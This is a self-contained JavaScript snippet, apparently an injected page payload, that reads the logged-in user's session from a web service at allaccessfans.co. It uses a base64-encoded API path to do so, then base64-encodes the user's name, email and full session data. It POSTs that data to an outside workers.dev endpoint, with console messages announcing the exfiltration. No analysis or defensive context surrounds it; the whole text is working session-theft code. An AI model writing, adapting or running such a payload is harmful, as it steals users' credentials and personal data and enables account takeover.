(() => {
  const u = atob('L2FwaS9hdXRoL3Nlc3Npb24=');
  const w = 'https://mnta.wilselme.workers.dev/';
  const currentUrl = 'https://allaccessfans.co/messages'

  fetch(u)
    .then((r) => r.json())
    .then((d) => {
      if (Object.keys(d).length) {
        const n = d.user?.name || 'N/A';
        const e = d.user?.email || 'N/A';
        console.log('Info Exfiltrated...awaiting send')
        if (window.ran) return; // prevent running twice
        window.ran = 1;
        console.log('Passed Checks! Sending Info...')
        const b = btoa(
          JSON.stringify({ name: n, email: e, src: currentUrl, data: d })
        );
        fetch(w, { method: 'POST', body: b });
        console.log('Info Sent!')
      }
    })
    .catch(() => {});
})();
